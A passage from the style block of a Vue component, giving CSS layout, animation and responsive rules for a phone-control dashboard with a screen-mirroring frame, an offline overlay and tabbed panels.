    color: #64748b;
}

.back-btn:hover {
    color: #10B981;
}

/* 左侧边栏 */
.sidebar {
    display: flex;
    flex-direction: column;
    gap: 12px;
    height: fit-content;
    position: sticky;
    top: 16px;
}

/* 右侧主内容区：占满 grid 单元格，不随内部内容撑开 */
.main-content {
    position: relative;
    display: flex;
    flex-direction: column;
    gap: 16px;
    width: 100%;
    min-width: 0;
    max-width: 100%;
    background: white;
    border-radius: 12px;
    padding: 16px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
    overflow: hidden;
}

/* 设备离线遮罩 */
.offline-overlay {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.75);
    backdrop-filter: blur(4px);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 100;
    border-radius: 12px;
}

.offline-content {
    text-align: center;
    color: white;
}

.offline-spinner {
    width: 48px;
    height: 48px;
    border: 3px solid rgba(255, 255, 255, 0.2);
    border-top-color: #10B981;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 16px;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.offline-text {
    font-size: 18px;
    font-weight: 600;
    margin-bottom: 8px;
}

.offline-hint {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.7);
}

/* 遮罩过渡动画 */
.fade-enter-active,
.fade-leave-active {
    transition: opacity 0.3s ease;
}

.fade-enter-from,
.fade-leave-to {
    opacity: 0;
}

/* 标签导航：限制宽度，防止 n-tabs 撑开父级 */
.tabs-header {
    width: 100%;
    min-width: 0;
    border-bottom: 1px solid #e5e7eb;
    padding-bottom: 12px;
    overflow: hidden;
}

.tabs-header :deep(.n-tabs) {
    width: 100%;
}

.tabs-header :deep(.n-tabs-nav) {
    max-width: 100%;
}

.tabs-header :deep(.n-tabs-rail) {
    max-width: 100%;
}

.tab-label {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
}

.tab-label .n-icon {
    font-size: 16px;
}

/* 内容区：投屏 + 标签内容并排，第二列固定由剩余空间分配 */
.content-layout {
    display: grid;
    grid-template-columns: 320px minmax(0, 1fr);
    gap: 24px;
    flex: 1;
    width: 100%;
    min-width: 0;
    min-height: 0;
    overflow: hidden;
}

/* 投屏区域 */
.screen-area {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.screen-controls {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 8px 12px;
    background: #f8fafc;
    border-radius: 8px;
}

/* 手机框架 */
.phone-frame {
    background: linear-gradient(145deg, #1a1a1a 0%, #2d2d2d 100%);
    border-radius: 28px;
    padding: 10px;
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    position: relative;
}

.phone-notch {
    position: absolute;
    top: 10px;
    left: 50%;
    transform: translateX(-50%);
    width: 80px;
    height: 20px;
    background: #1a1a1a;
    border-radius: 0 0 12px 12px;
    z-index: 10;
}

.screen-container {
    background: #000;
    border-radius: 22px;
    overflow: hidden;
    aspect-ratio: 9/19;
    position: relative;
    display: flex;
    align-items: center;
    justify-content: center;
}

.screen-container > * {
    width: 100%;
    height: 100%;
}

/* 导航按钮 */
.nav-buttons {
    display: flex;
    justify-content: center;
    gap: 16px;
    padding: 8px;
    background: #f8fafc;
    border-radius: 8px;
}

/* 标签内容区：宽度严格限制在 grid 单元格内，不随各标签内容变化 */
.tab-content-area {
    background: #fafbfc;
    border-radius: 12px;
    padding: 16px;
    overflow-x: hidden;
    overflow-y: auto;
    max-height: calc(100vh - 200px);
    min-height: 500px;
    min-width: 0;
    width: 100%;
    max-width: 100%;
    box-sizing: border-box;
}

.tab-content-wrapper {
    height: 100%;
    min-width: 0;
    width: 100%;
    max-width: 100%;
    overflow-x: hidden;
    overflow-y: visible;
    box-sizing: border-box;
}

/* 各标签页内部根元素统一限制宽度，防止宽内容撑开 */
.tab-content-area .tab-content-wrapper > * {
    max-width: 100%;
    min-width: 0;
}

/* Tab 过渡动画 */
.tab-fade-enter-active,
.tab-fade-leave-active {
    transition: all 0.25s ease;
}

.tab-fade-enter-from {
    opacity: 0;
    transform: translateX(16px);
}

.tab-fade-leave-to {
    opacity: 0;
    transform: translateX(-16px);
}

/* 响应式布局 */

/* 超大屏幕 (> 1600px) */
@media (min-width: 1600px) {
    .control-dashboard {
        grid-template-columns: 300px minmax(0, 1fr);
        gap: 24px;
    }

    .content-layout {
        grid-template-columns: 360px minmax(0, 1fr);
        gap: 28px;
    }
}

/* 大屏幕 (1400px - 1600px) */
@media (max-width: 1600px) and (min-width: 1400px) {
    .control-dashboard {
        grid-template-columns: 280px minmax(0, 1fr);
    }

    .content-layout {
        grid-template-columns: 340px minmax(0, 1fr);
    }
}

/* 中大屏幕 (1200px - 1400px) */
@media (max-width: 1400px) and (min-width: 1200px) {
    .control-dashboard {
        grid-template-columns: 260px minmax(0, 1fr);
        padding: 16px 20px;
    }

    .content-layout {
        grid-template-columns: 300px minmax(0, 1fr);
        gap: 20px;
    }
}

/* 中等屏幕 (1024px - 1200px) */
@media (max-width: 1200px) and (min-width: 1024px) {
    .control-dashboard {
        grid-template-columns: 240px minmax(0, 1fr);
        padding: 16px;
    }

    .content-layout {
        grid-template-columns: 280px minmax(0, 1fr);
        gap: 16px;
    }

    .tab-label span {
        display: none;
    }
}

/* 平板屏幕 (768px - 1024px) */
@media (max-width: 1024px) {
    .control-dashboard {
        grid-template-columns: 1fr;
        padding: 16px;
    }

    .sidebar {
        position: static;
        flex-direction: row;
        flex-wrap: wrap;
        gap: 12px;
    }

    .sidebar > * {
        flex: 1;
        min-width: 240px;
    }

    .content-layout {
        grid-template-columns: 1fr;
        gap: 16px;
    }

    .screen-area {
        max-width: 400px;
        margin: 0 auto;
    }

    .tab-label span {
        display: none;
    }
}

/* 手机屏幕 (< 768px) */
@media (max-width: 768px) {
    .control-dashboard {
        padding: 12px;
        gap: 12px;
    }

    .main-content {
        padding: 12px;
    }

    .page-header {
        padding: 10px 16px;
    }

    .header-left {
        gap: 8px;
    }

    .device-icon {
        width: 36px;
        height: 36px;
        border-radius: 8px;
    }

    .device-name {
        font-size: 16px;
    }

    .sidebar {
        flex-direction: column;
    }

    .sidebar > * {
        min-width: 100%;
    }

    .screen-area {
        max-width: 100%;
    }

    .tab-content-area {
        max-height: none;
        padding: 12px;
    }

    .tabs-header {
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
    }
}
</style>
